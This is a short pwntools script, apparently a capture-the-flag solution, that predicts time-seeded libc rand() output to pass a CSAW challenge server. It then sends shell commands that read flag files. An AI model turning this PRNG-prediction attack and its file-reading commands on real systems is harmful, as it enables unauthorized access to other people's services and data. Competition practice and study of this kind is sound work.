from pwn import *
import ctypes, time

context.log_level = 'error'
libc = ctypes.CDLL("libc.so.6")

def predict(seed):
    libc.srand(ctypes.c_uint(seed))
    return libc.rand() % 0x100000

now = int(time.time())
found = False
for offset in range(-30, 31, 3):
    try:
        p = remote("pwn.chal.csaw.io", 5000, timeout=5)
        vals = [str(predict(now + offset + i)).encode() for i in range(3)]
        for v in vals:
            p.sendline(v)
        p.sendline(b"cat flag.txt; cat /flag.txt; ls -la")
        time.sleep(0.5)
        out = p.recvrepeat(3)
        txt = out.decode(errors="replace")
        print("offset", offset, "|", txt.replace("\n", " ")[:200])
        if "flag{" in txt:
            print(txt)
            found = True
            break
        p.close()
    except Exception as e:
        print("offset", offset, "err", e)
